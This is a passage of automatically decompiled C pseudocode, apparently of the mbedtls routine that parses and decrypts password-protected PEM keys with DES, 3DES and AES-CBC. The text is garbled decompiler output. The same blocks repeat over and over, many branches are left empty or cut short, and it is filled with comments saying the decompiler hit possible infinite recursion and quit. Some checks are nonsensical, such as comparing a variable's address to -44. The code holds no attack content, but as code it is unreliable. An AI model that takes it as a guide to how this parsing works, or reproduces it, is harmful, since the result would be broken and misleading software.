                                                                        // branch -> 0x8063aa4
                                                                        // 0x8063aa4
                                                                        g3 = v1;
                                                                        g7 = v2;
                                                                        g5 = v3;
                                                                        return 0;
                                                                    }
                                                                }
                                                            }
                                                            // 0x8063f83
                                                            free(v47);
                                                            // branch -> 0x8063aa4
                                                            // 0x8063aa4
                                                            g3 = v1;
                                                            g7 = v2;
                                                            g5 = v3;
                                                            return -0x1380;
                                                        }
                                                        // 0x8063c73
                                                        if (v34 == 33) {
                                                            // 0x8063ed2
                                                            g5 = &v27;
                                                            mbedtls_des_init((char *)&v27);
                                                            g4 = &v28;
                                                            v24 = &v32;
                                                            g1 = v24;
                                                            g6 = 8;
                                                            pem_pbkdf1((char *)a5, a6, v23, v35, v33);
                                                            mbedtls_des_setkey_dec((int32_t *)g5, v24);
                                                            v36 = g7;
                                                            mbedtls_des_crypt_cbc(g5, 0, (char)size, &v28, v36, v36);
                                                            mbedtls_des_free((char *)g5);
                                                            *(char *)v24 = 0;
                                                            v21 = v24 + 1;
                                                            // branch -> 0x8063f4c
                                                            while (v21 != (int32_t)&v31) {
                                                                // 0x8063f4c
                                                                *(char *)v21 = 0;
                                                                v21++;
                                                                // continue -> 0x8063f4c
                                                            }
                                                            // 0x8063cb7
                                                            v53 = size;
                                                            v49 = g7;
                                                            v47 = (char *)v49;
                                                            if (v53 >= 3) {
                                                                // 0x8063cc3
                                                                if (*v47 == 48) {
                                                                    // 0x8063ccc
                                                                    if (*(char *)(v49 + 1) <= 131) {
                                                                        // 0x8063cd6
                                                                        *(int32_t *)(g3 + 4) = v53;
                                                                        *(int32_t *)g3 = g7;
                                                                        // branch -> 0x8063aa4
                                                                        // 0x8063aa4
                                                                        g3 = v1;
                                                                        g7 = v2;
                                                                        g5 = v3;
                                                                        return 0;
                                                                    }
                                                                }
                                                            }
                                                            // 0x8063f83
                                                            free(v47);
                                                            // branch -> 0x8063aa4
                                                            // 0x8063aa4
                                                            g3 = v1;
                                                            g7 = v2;
                                                            g5 = v3;
                                                            return -0x1380;
                                                        }
                                                        // 0x8063c7c
                                                        if (v34 == 5) {
                                                            // 0x8063eaa
                                                            g1 = &v28;
                                                            g4 = g7;
                                                            g5 = a5;
                                                            g6 = 16;
                                                            pem_aes_decrypt(size, a5, a6, v35, v33, v30);
                                                            // branch -> 0x8063cb7
                                                            // 0x8063cb7
                                                            v53 = size;
                                                            v49 = g7;
                                                            v47 = (char *)v49;
                                                            if (v53 >= 3) {
                                                                // 0x8063cc3
                                                                if (*v47 == 48) {
                                                                    // 0x8063ccc
                                                                    if (*(char *)(v49 + 1) <= 131) {
                                                                        // 0x8063cd6
                                                                        *(int32_t *)(g3 + 4) = v53;
                                                                        *(int32_t *)g3 = g7;
                                                                        // branch -> 0x8063aa4
                                                                        // 0x8063aa4
                                                                        g3 = v1;
                                                                        g7 = v2;
                                                                        g5 = v3;
                                                                        return 0;
                                                                    }
                                                                }
                                                            }
                                                            // 0x8063f83
                                                            free(v47);
                                                            // branch -> 0x8063aa4
                                                            // 0x8063aa4
                                                            g3 = v1;
                                                            g7 = v2;
                                                            g5 = v3;
                                                            return -0x1380;
                                                        }
                                                        // 0x8063c86
                                                        if (v34 == 6) {
                                                            // 0x8063f5b
                                                            g1 = &v28;
                                                            g4 = g7;
                                                            g5 = a5;
                                                            g6 = 24;
                                                            pem_aes_decrypt(size, a5, a6, v35, v33, v30);
                                                            // branch -> 0x8063cb7
                                                        } else {
                                                            // 0x8063c8f
                                                            if (v34 == 7) {
                                                                // 0x8063c94
                                                                g1 = &v28;
                                                                g4 = g7;
                                                                g5 = a5;
                                                                g6 = 32;
                                                                pem_aes_decrypt(size, a5, a6, v35, v33, v30);
                                                                // branch -> 0x8063cb7
                                                            }
                                                        }
                                                        // 0x8063cb7
                                                        v53 = size;
                                                        v49 = g7;
                                                        v47 = (char *)v49;
                                                        if (v53 >= 3) {
                                                            // 0x8063cc3
                                                            if (*v47 == 48) {
                                                                // 0x8063ccc
                                                                if (*(char *)(v49 + 1) <= 131) {
                                                                    // 0x8063cd6
                                                                    *(int32_t *)(g3 + 4) = v53;
                                                                    *(int32_t *)g3 = g7;
                                                                    // branch -> 0x8063aa4
                                                                    // 0x8063aa4
                                                                    g3 = v1;
                                                                    g7 = v2;
                                                                    g5 = v3;
                                                                    return 0;
                                                                }
                                                            }
                                                        }
                                                        // 0x8063f83
                                                        free(v47);
                                                        // branch -> 0x8063aa4
                                                        // 0x8063aa4
                                                        g3 = v1;
                                                        g7 = v2;
                                                        g5 = v3;
                                                        return -0x1380;
                                                    }
                                                    // 0x8063aa4
                                                    g3 = v1;
                                                    g7 = v2;
                                                    g5 = v3;
                                                    return -0x1300;
                                                }
                                            }
                                            // 0x8063cf8
                                            result = -0x1100;
                                            // branch -> 0x8063aa4
                                        } else {
                                            // 0x8063e12
                                            result = -0x1200;
                                            // branch -> 0x8063aa4
                                        }
                                        // 0x8063aa4
                                        g3 = v1;
                                        g7 = v2;
                                        g5 = v3;
                                        return result;
                                    }
                                    v46 = "DEK-Info: AES-192-CBC,";
                                }
                                // 0x8063dfa
                                g1 = g7 + 22;
                                g4 = 16;
                                g6 = &v28;
                                if (pem_get_iv((int32_t)v45, (int32_t)v46, 22) == NULL) {
                                    // 0x8063ea2
                                    v44 = g7 + 54;
                                    g7 = v44;
                                    v50 = v44;
                                    // branch -> 0x8063e22
                                    // 0x8063e22
                                    v48 = *(char *)v50;
                                    v52 = v50;
                                    v51 = v48;
                                    if (v48 == 13) {
                                        // 0x8063e29
                                        v43 = v50 + 1;
                                        g7 = v43;
                                        v52 = v43;
                                        v51 = (int32_t)*(char *)v43;
                                        // branch -> 0x8063e2f
                                    }
                                    // 0x8063e2f
                                    if (v51 == 10) {
                                        // 0x8063e37
                                        v35 = v52 + 1;
                                        // branch -> 0x8063bac
                                        // 0x8063bac
                                        if (v4 != v35) {
                                            // 0x8063bb8
                                            v33 = v4 - v35;
                                            v23 = &size;
                                            mbedtls_base64_decode(NULL, 0, &size, v35, v33);
                                            g4 = v23;
                                            if (&size == (int32_t *)-44) {
                                                // 0x8063aa4
                                                g3 = v1;
                                                g7 = v2;
                                                g5 = v3;
                                                return -0x112c;
                                            }
                                            // 0x8063bff
                                            mem = calloc(1, size);
                                            g7 = (int32_t)mem;
                                            if (mem == NULL) {
                                                // 0x8063aa4
                                                g3 = v1;
                                                g7 = v2;
                                                g5 = v3;
                                                return -0x1180;
                                            }
                                            // 0x8063c27
                                            if (mbedtls_base64_decode(mem, size, &size, v35, v33) == 0) {
                                                // 0x8063c60
                                                if (a5 == 0) {
                                                    // 0x8064028
                                                    free((char *)g7);
                                                    // branch -> 0x8063aa4
                                                } else {
                                                    // 0x8063c6a
                                                    v34 = g5;
                                                    if (v34 == 37) {
                                                        // 0x8063f95
                                                        g5 = &v29;
                                                        mbedtls_des3_init((char *)&v29);
                                                        v25 = &v28;
                                                        g4 = v25;
                                                        g6 = 24;
                                                        v26 = &v32;
                                                        g1 = v26;
                                                        pem_pbkdf1((char *)a5, a6, v23, v35, v33);
                                                        mbedtls_des3_set3key_dec(g5, v26);
                                                        g4 = v26;
                                                        v37 = g7;
                                                        mbedtls_des3_crypt_cbc(g5, 0, (char)size, &v28, v37, v37);
                                                        mbedtls_des3_free((char *)g5);
                                                        *(char *)v26 = 0;
                                                        v22 = v26 + 1;
                                                        // branch -> 0x8064015
                                                        while (v22 != v25) {
                                                            // 0x8064015
                                                            *(char *)v22 = 0;
                                                            v22++;
                                                            // continue -> 0x8064015
                                                        }
                                                        // 0x8063cb7
                                                        v53 = size;
                                                        v49 = g7;
                                                        v47 = (char *)v49;
                                                        if (v53 >= 3) {
                                                            // 0x8063cc3
                                                            if (*v47 == 48) {
                                                                // 0x8063ccc
                                                                if (*(char *)(v49 + 1) <= 131) {
                                                                    // 0x8063cd6
                                                                    *(int32_t *)(g3 + 4) = v53;
                                                                    *(int32_t *)g3 = g7;
                                                                    // branch -> 0x8063aa4
                                                                    // 0x8063aa4
                                                                    g3 = v1;
                                                                    g7 = v2;
                                                                    g5 = v3;
                                                                    return 0;
                                                                }
                                                            }
                                                        }
                                                        // 0x8063f83
                                                        free(v47);
                                                        // branch -> 0x8063aa4
                                                        // 0x8063aa4
                                                        g3 = v1;
                                                        g7 = v2;
                                                        g5 = v3;
                                                        return -0x1380;
                                                    }
                                                    // 0x8063c73
                                                    if (v34 == 33) {
                                                        // 0x8063ed2
                                                        g5 = &v27;
                                                        mbedtls_des_init((char *)&v27);
                                                        g4 = &v28;
                                                        v24 = &v32;
                                                        g1 = v24;
                                                        g6 = 8;
                                                        pem_pbkdf1((char *)a5, a6, v23, v35, v33);
                                                        mbedtls_des_setkey_dec((int32_t *)g5, v24);
                                                        v36 = g7;
                                                        mbedtls_des_crypt_cbc(g5, 0, (char)size, &v28, v36, v36);
                                                        mbedtls_des_free((char *)g5);
                                                        *(char *)v24 = 0;
                                                        v21 = v24 + 1;
                                                        // branch -> 0x8063f4c
                                                        while (v21 != (int32_t)&v31) {
                                                            // 0x8063f4c
                                                            *(char *)v21 = 0;
                                                            v21++;
                                                            // continue -> 0x8063f4c
                                                        }
                                                        // 0x8063cb7
                                                        v53 = size;
                                                        v49 = g7;
                                                        v47 = (char *)v49;
                                                        if (v53 >= 3) {
                                                            // 0x8063cc3
                                                            if (*v47 == 48) {
                                                                // 0x8063ccc
                                                                if (*(char *)(v49 + 1) <= 131) {
                                                                    // 0x8063cd6
                                                                    *(int32_t *)(g3 + 4) = v53;
                                                                    *(int32_t *)g3 = g7;
                                                                    // branch -> 0x8063aa4
                                                                    // 0x8063aa4
                                                                    g3 = v1;
                                                                    g7 = v2;
                                                                    g5 = v3;
                                                                    return 0;
                                                                }
                                                            }
                                                        }
                                                        // 0x8063f83
                                                        free(v47);
                                                        // branch -> 0x8063aa4
                                                        // 0x8063aa4
                                                        g3 = v1;
                                                        g7 = v2;
                                                        g5 = v3;
                                                        return -0x1380;
                                                    }
                                                    // 0x8063c7c
                                                    if (v34 == 5) {
                                                        // 0x8063eaa
                                                        g1 = &v28;
                                                        g4 = g7;
                                                        g5 = a5;
                                                        g6 = 16;
                                                        pem_aes_decrypt(size, a5, a6, v35, v33, v30);
                                                        // branch -> 0x8063cb7
                                                    } else {
                                                        // 0x8063c86
                                                        if (v34 == 6) {
                                                            // 0x8063f5b
                                                            g1 = &v28;
                                                            g4 = g7;
                                                            g5 = a5;
                                                            g6 = 24;
                                                            pem_aes_decrypt(size, a5, a6, v35, v33, v30);
                                                            // branch -> 0x8063cb7
                                                        } else {
                                                            // 0x8063c8f
                                                            if (v34 == 7) {
                                                                // 0x8063c94
                                                                g1 = &v28;
                                                                g4 = g7;
                                                                g5 = a5;
                                                                g6 = 32;
                                                                pem_aes_decrypt(size, a5, a6, v35, v33, v30);
                                                                // branch -> 0x8063cb7
                                                            }
                                                        }
                                                        // 0x8063cb7
                                                        v53 = size;
                                                        v49 = g7;
                                                        v47 = (char *)v49;
                                                        if (v53 >= 3) {
                                                            // 0x8063cc3
                                                            if (*v47 == 48) {
                                                                // 0x8063ccc
                                                                if (*(char *)(v49 + 1) <= 131) {
                                                                    // 0x8063cd6
                                                                    *(int32_t *)(g3 + 4) = v53;
                                                                    *(int32_t *)g3 = g7;
                                                                    // branch -> 0x8063aa4
                                                                    // Detected a possible infinite recursion (goto support failed); quitting...
                                                                }
                                                            }
                                                        }
                                                        // 0x8063f83
                                                        free(v47);
                                                        // branch -> 0x8063aa4
                                                        // Detected a possible infinite recursion (goto support failed); quitting...
                                                    }
                                                    // 0x8063cb7
                                                    v53 = size;
                                                    v49 = g7;
                                                    v47 = (char *)v49;
                                                    if (v53 >= 3) {
                                                        // 0x8063cc3
                                                        if (*v47 == 48) {
                                                            // 0x8063ccc
                                                            if (*(char *)(v49 + 1) <= 131) {
                                                                // 0x8063cd6
                                                                *(int32_t *)(g3 + 4) = v53;
                                                                *(int32_t *)g3 = g7;
                                                                // branch -> 0x8063aa4
                                                                // Detected a possible infinite recursion (goto support failed); quitting...
                                                            }
                                                        }
                                                    }
                                                    // 0x8063f83
                                                    free(v47);
                                                    // branch -> 0x8063aa4
                                                    // Detected a possible infinite recursion (goto support failed); quitting...
                                                    // 0x8063cb7
                                                    v53 = size;
                                                    v49 = g7;
                                                    v47 = (char *)v49;
                                                    if (v53 >= 3) {
                                                        // 0x8063cc3
                                                        if (*v47 == 48) {
                                                            // 0x8063ccc
                                                            if (*(char *)(v49 + 1) <= 131) {
                                                                // 0x8063cd6
                                                                *(int32_t *)(g3 + 4) = v53;
                                                                *(int32_t *)g3 = g7;
                                                                // branch -> 0x8063aa4
                                                                // Detected a possible infinite recursion (goto support failed); quitting...
                                                            }
                                                        }
                                                    }
                                                    // 0x8063f83
                                                    free(v47);
                                                    // branch -> 0x8063aa4
                                                    // Detected a possible infinite recursion (goto support failed); quitting...
                                                    // 0x8063cb7
                                                    v53 = size;
                                                    v49 = g7;
                                                    v47 = (char *)v49;
                                                    if (v53 >= 3) {
                                                        // 0x8063cc3
                                                        if (*v47 == 48) {
                                                            // 0x8063ccc
                                                            if (*(char *)(v49 + 1) <= 131) {
                                                                // 0x8063cd6
                                                                *(int32_t *)(g3 + 4) = v53;
                                                                *(int32_t *)g3 = g7;
                                                                // branch -> 0x8063aa4
                                                                // Detected a possible infinite recursion (goto support failed); quitting...
                                                            }
                                                        }
                                                    }
                                                    // 0x8063f83
                                                    free(v47);
                                                    // branch -> 0x8063aa4
                                                }
                                                // Detected a possible infinite recursion (goto support failed); quitting...
                                                // Detected a possible infinite recursion (goto support failed); quitting...
                                            } else {
                                                // 0x8064042
                                                free((char *)g7);
                                                // branch -> 0x8063aa4
                                            }
                                            // Detected a possible infinite recursion (goto support failed); quitting...
                                        }
                                    }
                                    // 0x8063cf8
                                    // branch -> 0x8063aa4
                                }
                                // Detected a possible infinite recursion (goto support failed); quitting...
                            } else {
                                // 0x8063e1c
                                if (g5 == 0) {
                                    // 0x8063dec
                                    // branch -> 0x8063aa4
                                } else {
                                    // 0x8063e1c
                                    v50 = g7;
                                    // branch -> 0x8063e22
                                    // 0x8063e22
                                    v48 = *(char *)v50;
                                    v52 = v50;
                                    v51 = v48;
                                    if (v48 == 13) {
                                        // 0x8063e29
                                        v43 = v50 + 1;
                                        g7 = v43;
                                        v52 = v43;
                                        v51 = (int32_t)*(char *)v43;
                                        // branch -> 0x8063e2f
                                    }
                                    // 0x8063e2f
                                    if (v51 == 10) {
                                        // 0x8063e37
                                        v35 = v52 + 1;
                                        // branch -> 0x8063bac
                                        // 0x8063bac
                                        if (v4 != v35) {
                                            // 0x8063bb8
                                            v33 = v4 - v35;
                                            v23 = &size;
                                            mbedtls_base64_decode(NULL, 0, &size, v35, v33);
                                            g4 = v23;
                                            if (&size == (int32_t *)-44) {
                                                // Detected a possible infinite recursion (goto support failed); quitting...
                                            }
                                            // 0x8063bff
                                            mem = calloc(1, size);
                                            g7 = (int32_t)mem;
                                            if (mem == NULL) {
                                                // Detected a possible infinite recursion (goto support failed); quitting...
                                            }
                                            // 0x8063c27
                                            if (mbedtls_base64_decode(mem, size, &size, v35, v33) == 0) {
                                                // 0x8063c60
                                                if (a5 == 0) {
                                                    // 0x8064028
                                                    free((char *)g7);
                                                    // branch -> 0x8063aa4
                                                } else {
                                                    // 0x8063c6a
                                                    v34 = g5;
                                                    if (v34 == 37) {
                                                        // 0x8063f95
                                                        g5 = &v29;
                                                        mbedtls_des3_init((char *)&v29);
                                                        v25 = &v28;
                                                        g4 = v25;
                                                        g6 = 24;
                                                        v26 = &v32;
                                                        g1 = v26;
                                                        pem_pbkdf1((char *)a5, a6, v23, v35, v33);
                                                        mbedtls_des3_set3key_dec(g5, v26);
                                                        g4 = v26;
                                                        v37 = g7;
                                                        mbedtls_des3_crypt_cbc(g5, 0, (char)size, &v28, v37, v37);
                                                        mbedtls_des3_free((char *)g5);
                                                        *(char *)v26 = 0;
                                                        v22 = v26 + 1;
                                                        // branch -> 0x8064015
                                                        while (v22 != v25) {
                                                            // 0x8064015
                                                            *(char *)v22 = 0;
                                                            v22++;
                                                            // continue -> 0x8064015
                                                        }
                                                        // 0x8063cb7
                                                        v53 = size;
                                                        v49 = g7;
                                                        v47 = (char *)v49;
                                                        if (v53 >= 3) {
                                                            // 0x8063cc3
                                                            if (*v47 == 48) {
                                                                // 0x8063ccc
                                                                if (*(char *)(v49 + 1) <= 131) {
                                                                    // 0x8063cd6
                                                                    *(int32_t *)(g3 + 4) = v53;
                                                                    *(int32_t *)g3 = g7;
                                                                    // branch -> 0x8063aa4
                                                                    // Detected a possible infinite recursion (goto support failed); quitting...
                                                                }
                                                            }
                                                        }
                                                        // 0x8063f83
                                                        free(v47);
                                                        // branch -> 0x8063aa4
                                                        // Detected a possible infinite recursion (goto support failed); quitting...
                                                    } else {
                                                        // 0x8063c73
                                                        if (v34 == 33) {
                                                            // 0x8063ed2
                                                            g5 = &v27;
                                                            mbedtls_des_init((char *)&v27);
                                                            g4 = &v28;
                                                            v24 = &v32;
                                                            g1 = v24;
                                                            g6 = 8;
                                                            pem_pbkdf1((char *)a5, a6, v23, v35, v33);
                                                            mbedtls_des_setkey_dec((int32_t *)g5, v24);
                                                            v36 = g7;
                                                            mbedtls_des_crypt_cbc(g5, 0, (char)size, &v28, v36, v36);
                                                            mbedtls_des_free((char *)g5);
                                                            *(char *)v24 = 0;
                                                            v21 = v24 + 1;
                                                            // branch -> 0x8063f4c
                                                            while (v21 != (int32_t)&v31) {
                                                                // 0x8063f4c
                                                                *(char *)v21 = 0;
                                                                v21++;
                                                                // continue -> 0x8063f4c
                                                            }
                                                            // 0x8063cb7
                                                            v53 = size;
                                                            v49 = g7;
                                                            v47 = (char *)v49;
                                                            if (v53 >= 3) {
                                                                // 0x8063cc3
                                                                if (*v47 == 48) {
                                                                    // 0x8063ccc
                                                                    if (*(char *)(v49 + 1) <= 131) {
                                                                        // 0x8063cd6
                                                                        *(int32_t *)(g3 + 4) = v53;
                                                                        *(int32_t *)g3 = g7;
                                                                        // branch -> 0x8063aa4
                                                                        // Detected a possible infinite recursion (goto support failed); quitting...
                                                                    }
                                                                }
                                                            }
                                                            // 0x8063f83
                                                            free(v47);
                                                            // branch -> 0x8063aa4
                                                            // Detected a possible infinite recursion (goto support failed); quitting...
                                                        } else {
                                                            // 0x8063c7c
                                                            if (v34 == 5) {
                                                                // 0x8063eaa
                                                                g1 = &v28;
                                                                g4 = g7;
                                                                g5 = a5;
                                                                g6 = 16;
                                                                pem_aes_decrypt(size, a5, a6, v35, v33, v30);
                                                                // branch -> 0x8063cb7
                                                            } else {
                                                                // 0x8063c86
                                                                if (v34 == 6) {
                                                                    // 0x8063f5b
                                                                    g1 = &v28;
                                                                    g4 = g7;
                                                                    g5 = a5;
                                                                    g6 = 24;
                                                                    pem_aes_decrypt(size, a5, a6, v35, v33, v30);
                                                                    // branch -> 0x8063cb7
                                                                } else {
                                                                    // 0x8063c8f
                                                                    if (v34 == 7) {
                                                                        // 0x8063c94
                                                                        g1 = &v28;
                                                                        g4 = g7;
                                                                        g5 = a5;
                                                                        g6 = 32;
                                                                        pem_aes_decrypt(size, a5, a6, v35, v33, v30);
                                                                        // branch -> 0x8063cb7
                                                                    }
                                                                }
                                                                // 0x8063cb7
                                                                v53 = size;
                                                                v49 = g7;
                                                                v47 = (char *)v49;
                                                                if (v53 >= 3) {
                                                                    // 0x8063cc3
                                                                    if (*v47 == 48) {
                                                                        // 0x8063ccc
                                                                        if (*(char *)(v49 + 1) <= 131) {
                                                                            // 0x8063cd6
                                                                            *(int32_t *)(g3 + 4) = v53;
                                                                            *(int32_t *)g3 = g7;
                                                                            // branch -> 0x8063aa4
                                                                            // Detected a possible infinite recursion (goto support failed); quitting...
                                                                        }
                                                                    }
                                                                }
                                                                // 0x8063f83
                                                                free(v47);
                                                                // branch -> 0x8063aa4
                                                                // Detected a possible infinite recursion (goto support failed); quitting...
                                                            }
                                                            // 0x8063cb7
                                                            v53 = size;
                                                            v49 = g7;
                                                            v47 = (char *)v49;
                                                            if (v53 >= 3) {
                                                                // 0x8063cc3
                                                                if (*v47 == 48) {
                                                                    // 0x8063ccc
                                                                    if (*(char *)(v49 + 1) <= 131) {
                                                                        // 0x8063cd6
                                                                        *(int32_t *)(g3 + 4) = v53;
                                                                        *(int32_t *)g3 = g7;
                                                                        // branch -> 0x8063aa4
                                                                        // Detected a possible infinite recursion (goto support failed); quitting...
                                                                    }
                                                                }
                                                            }
                                                            // 0x8063f83
                                                            free(v47);
                                                            // branch -> 0x8063aa4
                                                            // Detected a possible infinite recursion (goto support failed); quitting...
                                                        }
                                                        // 0x8063cb7
                                                        v53 = size;
                                                        v49 = g7;
                                                        v47 = (char *)v49;
                                                        if (v53 >= 3) {
                                                            // 0x8063cc3
                                                            if (*v47 == 48) {
                                                                // 0x8063ccc
                                                                if (*(char *)(v49 + 1) <= 131) {
                                                                    // 0x8063cd6
                                                                    *(int32_t *)(g3 + 4) = v53;
                                                                    *(int32_t *)g3 = g7;
                                                                    // branch -> 0x8063aa4
                                                                    // Detected a possible infinite recursion (goto support failed); quitting...
                                                                }
                                                            }
                                                        }
                                                        // 0x8063f83
                                                        free(v47);
                                                        // branch -> 0x8063aa4
                                                        // Detected a possible infinite recursion (goto support failed); quitting...
                                                    }
                                                    // 0x8063cb7
                                                    v53 = size;
                                                    v49 = g7;
                                                    v47 = (char *)v49;
                                                    if (v53 >= 3) {
                                                        // 0x8063cc3
                                                        if (*v47 == 48) {
                                                            // 0x8063ccc
                                                            if (*(char *)(v49 + 1) <= 131) {
                                                                // 0x8063cd6
                                                                *(int32_t *)(g3 + 4) = v53;
                                                                *(int32_t *)g3 = g7;
                                                                // branch -> 0x8063aa4
                                                                // Detected a possible infinite recursion (goto support failed); quitting...
                                                            }
                                                        }
                                                    }
                                                    // 0x8063f83
                                                    free(v47);
                                                    // branch -> 0x8063aa4
                                                }
                                                // Detected a possible infinite recursion (goto support failed); quitting...
                                                // Detected a possible infinite recursion (goto support failed); quitting...
                                            } else {
                                                // 0x8064042
                                                free((char *)g7);
                                                // branch -> 0x8063aa4
                                            }
                                            // Detected a possible infinite recursion (goto support failed); quitting...
                                        }
                                    }
                                    // 0x8063cf8
                                    // branch -> 0x8063aa4
                                }
                                // Detected a possible infinite recursion (goto support failed); quitting...
                            }
                            // 0x8063e22
                            v48 = *(char *)v50;
                            v52 = v50;
                            v51 = v48;
                            if (v48 == 13) {
                                // 0x8063e29
                                v43 = v50 + 1;
                                g7 = v43;
                                v52 = v43;
                                v51 = (int32_t)*(char *)v43;
                                // branch -> 0x8063e2f
                            }
                            // 0x8063e2f
                            if (v51 == 10) {
                                // 0x8063e37
                                v35 = v52 + 1;
                                // branch -> 0x8063bac
                                // 0x8063bac
                                if (v4 != v35) {
                                    // 0x8063bb8
                                    v33 = v4 - v35;
                                    v23 = &size;
                                    mbedtls_base64_decode(NULL, 0, &size, v35, v33);
                                    g4 = v23;
                                    if (&size == (int32_t *)-44) {
                                        // Detected a possible infinite recursion (goto support failed); quitting...
                                    }
                                    // 0x8063bff
                                    mem = calloc(1, size);
                                    g7 = (int32_t)mem;
                                    if (mem == NULL) {
                                        // Detected a possible infinite recursion (goto support failed); quitting...
                                    }
                                    // 0x8063c27
                                    if (mbedtls_base64_decode(mem, size, &size, v35, v33) == 0) {
                                        // 0x8063c60
                                        if (a5 == 0) {
                                            // 0x8064028
                                            free((char *)g7);
                                            // branch -> 0x8063aa4
                                        } else {
                                            // 0x8063c6a
                                            v34 = g5;
                                            if (v34 == 37) {
                                                // 0x8063f95
                                                g5 = &v29;
                                                mbedtls_des3_init((char *)&v29);
                                                v25 = &v28;
                                                g4 = v25;
                                                g6 = 24;
                                                v26 = &v32;
                                                g1 = v26;
                                                pem_pbkdf1((char *)a5, a6, v23, v35, v33);
                                                mbedtls_des3_set3key_dec(g5, v26);
                                                g4 = v26;
                                                v37 = g7;
                                                mbedtls_des3_crypt_cbc(g5, 0, (char)size, &v28, v37, v37);
                                                mbedtls_des3_free((char *)g5);
                                                *(char *)v26 = 0;
                                                v22 = v26 + 1;
                                                // branch -> 0x8064015
                                                while (v22 != v25) {
                                                    // 0x8064015
                                                    *(char *)v22 = 0;
                                                    v22++;
                                                    // continue -> 0x8064015
                                                }
                                                // 0x8063cb7
                                                v53 = size;
                                                v49 = g7;
                                                v47 = (char *)v49;
                                                if (v53 >= 3) {
                                                    // 0x8063cc3
                                                    if (*v47 == 48) {
                                                        // 0x8063ccc
                                                        if (*(char *)(v49 + 1) <= 131) {
                                                            // 0x8063cd6
                                                            *(int32_t *)(g3 + 4) = v53;
                                                            *(int32_t *)g3 = g7;
                                                            // branch -> 0x8063aa4
                                                            // Detected a possible infinite recursion (goto support failed); quitting...
                                                        }
                                                    }
                                                }
                                                // 0x8063f83
                                                free(v47);
                                                // branch -> 0x8063aa4
                                                // Detected a possible infinite recursion (goto support failed); quitting...
                                            } else {
                                                // 0x8063c73
                                                if (v34 == 33) {
                                                    // 0x8063ed2
                                                    g5 = &v27;
                                                    mbedtls_des_init((char *)&v27);
                                                    g4 = &v28;
                                                    v24 = &v32;
                                                    g1 = v24;
                                                    g6 = 8;
                                                    pem_pbkdf1((char *)a5, a6, v23, v35, v33);
                                                    mbedtls_des_setkey_dec((int32_t *)g5, v24);
                                                    v36 = g7;
                                                    mbedtls_des_crypt_cbc(g5, 0, (char)size, &v28, v36, v36);
                                                    mbedtls_des_free((char *)g5);
                                                    *(char *)v24 = 0;
                                                    v21 = v24 + 1;
                                                    // branch -> 0x8063f4c
                                                    while (v21 != (int32_t)&v31) {
                                                        // 0x8063f4c
                                                        *(char *)v21 = 0;
                                                        v21++;
                                                        // continue -> 0x8063f4c
                                                    }
                                                    // 0x8063cb7
                                                    v53 = size;
                                                    v49 = g7;
                                                    v47 = (char *)v49;
                                                    if (v53 >= 3) {
                                                        // 0x8063cc3
                                                        if (*v47 == 48) {
                                                            // 0x8063ccc
                                                            if (*(char *)(v49 + 1) <= 131) {
                                                                // 0x8063cd6
                                                                *(int32_t *)(g3 + 4) = v53;
                                                                *(int32_t *)g3 = g7;
                                                                // branch -> 0x8063aa4
                                                                // Detected a possible infinite recursion (goto support failed); quitting...
                                                            }
                                                        }
                                                    }
                                                    // 0x8063f83
                                                    free(v47);
                                                    // branch -> 0x8063aa4
                                                    // Detected a possible infinite recursion (goto support failed); quitting...
                                                } else {
                                                    // 0x8063c7c
                                                    if (v34 == 5) {
                                                        // 0x8063eaa
                                                        g1 = &v28;
                                                        g4 = g7;
                                                        g5 = a5;
                                                        g6 = 16;
                                                        pem_aes_decrypt(size, a5, a6, v35, v33, v30);
                                                        // branch -> 0x8063cb7
                                                    } else {
                                                        // 0x8063c86
                                                        if (v34 == 6) {
                                                            // 0x8063f5b
                                                            g1 = &v28;
                                                            g4 = g7;
                                                            g5 = a5;
                                                            g6 = 24;
                                                            pem_aes_decrypt(size, a5, a6, v35, v33, v30);
                                                            // branch -> 0x8063cb7
                                                        } else {
                                                            // 0x8063c8f
                                                            if (v34 == 7) {
                                                                // 0x8063c94
                                                                g1 = &v28;
                                                                g4 = g7;
                                                                g5 = a5;
                                                                g6 = 32;
                                                                pem_aes_decrypt(size, a5, a6, v35, v33, v30);
                                                                // branch -> 0x8063cb7
                                                            }
                                                        }
                                                        // 0x8063cb7
                                                        v53 = size;
                                                        v49 = g7;
                                                        v47 = (char *)v49;
                                                        if (v53 >= 3) {
                                                            // 0x8063cc3
                                                            if (*v47 == 48) {
                                                                // 0x8063ccc
                                                                if (*(char *)(v49 + 1) <= 131) {
                                                                    // 0x8063cd6
                                                                    *(int32_t *)(g3 + 4) = v53;
                                                                    *(int32_t *)g3 = g7;
                                                                    // branch -> 0x8063aa4
                                                                    // Detected a possible infinite recursion (goto support failed); quitting...
                                                                }
                                                            }
                                                        }
                                                        // 0x8063f83
                                                        free(v47);
                                                        // branch -> 0x8063aa4
                                                        // Detected a possible infinite recursion (goto support failed); quitting...
                                                    }
                                                    // 0x8063cb7
                                                    v49 = g7;
                                                    v47 = (char *)v49;
                                                    if (size >= 3) {
                                                        // 0x8063cc3
                                                        if (*v47 == 48) {
                                                            // 0x8063ccc
                                                            if (*(char *)(v49 + 1) <= 131) {
                                                                // Detected a possible infinite recursion (goto support failed); quitting...
                                                            }
                                                        }
                                                    }
                                                    // 0x8063f83
                                                    free(v47);
                                                    // branch -> 0x8063aa4
                                                    // Detected a possible infinite recursion (goto support failed); quitting...
                                                }
                                                // 0x8063cb7
                                                v49 = g7;
                                                v47 = (char *)v49;
                                                if (size >= 3) {
                                                    // 0x8063cc3
                                                    if (*v47 == 48) {
                                                        // 0x8063ccc
                                                        if (*(char *)(v49 + 1) <= 131) {
                                                            // Detected a possible infinite recursion (goto support failed); quitting...
                                                        }
                                                    }
                                                }
                                                // 0x8063f83
                                                free(v47);
                                                // branch -> 0x8063aa4
                                                // Detected a possible infinite recursion (goto support failed); quitting...
                                            }
                                            // 0x8063cb7
                                            v49 = g7;
                                            v47 = (char *)v49;
                                            if (size >= 3) {
                                                // 0x8063cc3
                                                if (*v47 == 48) {
                                                    // 0x8063ccc
                                                    if (*(char *)(v49 + 1) <= 131) {
                                                        // Detected a possible infinite recursion (goto support failed); quitting...
                                                    }
                                                }
                                            }
                                            // 0x8063f83
                                            free(v47);
                                            // branch -> 0x8063aa4
                                        }
                                        // Detected a possible infinite recursion (goto support failed); quitting...
                                        // Detected a possible infinite recursion (goto support failed); quitting...
                                    } else {
                                        // 0x8064042
                                        free((char *)g7);
                                        // branch -> 0x8063aa4
                                    }
                                    // Detected a possible infinite recursion (goto support failed); quitting...
                                }
                            }
                            // 0x8063cf8
                            // branch -> 0x8063aa4
